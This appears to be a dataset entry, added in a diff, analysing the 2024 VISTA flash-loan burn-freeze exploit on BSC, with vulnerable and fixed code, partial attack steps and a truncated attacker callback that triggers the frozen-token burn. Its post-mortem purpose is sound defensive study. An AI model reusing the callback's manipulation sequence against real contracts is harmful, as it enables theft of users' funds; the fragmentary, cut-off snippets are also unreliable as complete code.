@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-10-22_VISTA_FlashLoanFreeze",
+ "source_file": "2024/2024-10-22_VISTA_FlashLoanFreeze.md",
+ "title": "VISTA — Flash Loan Burn-Freeze Vulnerability Analysis",
+ "date": "2024-10-22",
+ "protocol": "VISTA",
+ "chain": "BSC",
+ "loss_raw": "~29,000 USDT",
+ "loss_usd": null,
+ "root_cause": "VISTA's burn logic burns frozen tokens during repayment, reducing AMM reserves and enabling price manipulation",
+ "attack_tx": "0x84c385aa",
+ "vulnerable_contract": "0x493361D6",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable VISTA flashLoan: allows burning of frozen tokens\ncontract VISTAToken {\n    mapping(address => bool) public frozen;\n\n    function flashLoan(\n        address receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external {\n        // Lend tokens\n        _transfer(address(this), receiver, amount);\n\n        // Execute callback\n        IFlashBorrower(receiver).onFlashLoan(/* ... */);\n\n        // Receive repayment\n        _transfer(receiver, address(this), amount + fee);\n\n        //",
+  "❌ Burns without checking frozen status\n        _burn(address(this), amount);  // Frozen tokens are burned as well\n    }\n}\n\n//",
+  "// File: VISTA_decompiled.sol\ncontract VISTA {\n    function burn(uint256 p0) external {}  // ❌ Vulnerable"
+ ],
+ "code_after": [
+  "✅ Fix: return balance instead of burning on flash loan repayment\n// Or: prevent frozen tokens from being burned"
+ ],
+ "steps": [
+  "[2] ▶ Swap USDT → BUSD",
+  "Deposit BUSD → receive VISTA tokens",
+  "Total supply decreases → VISTA price rises",
+  "[7] ▶ Sell remaining VISTA → USDT at inflated price"
+ ],
+ "other_code": [
+  "function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {\n    // USDT → BUSD\n    swap_token_to_token(address(USDT), address(BUSD), USDT.balanceOf(address(this)));\n\n    // Acquire VISTA (presale staking)\n    BUSD.approve(presale, BUSD.balanceOf(address(this)));\n    (bool success,) = presale.call(\n        abi.encodeWithSignature(\"stake(uint256,address)\", BUSD.balanceOf(address(this)) / 1e18, address(this))\n    );\n\n    // VISTA flash loan (trigger frozen token burn)\n    uint256 amount = IERC20(VISTA).balanceOf(address(this));\n    IERC20(VISTA).approve(address(VISTA), amount);\n    (bool success1,) = VISTA.call(\n        abi.encodeWithSignature(\"flashLoan(address,address,uint256,bytes)\", address(this), VISTA, amount, \"\")\n    );\n\n    USDT.transfer(address(pool), borrow_amount "
+ ]
+}
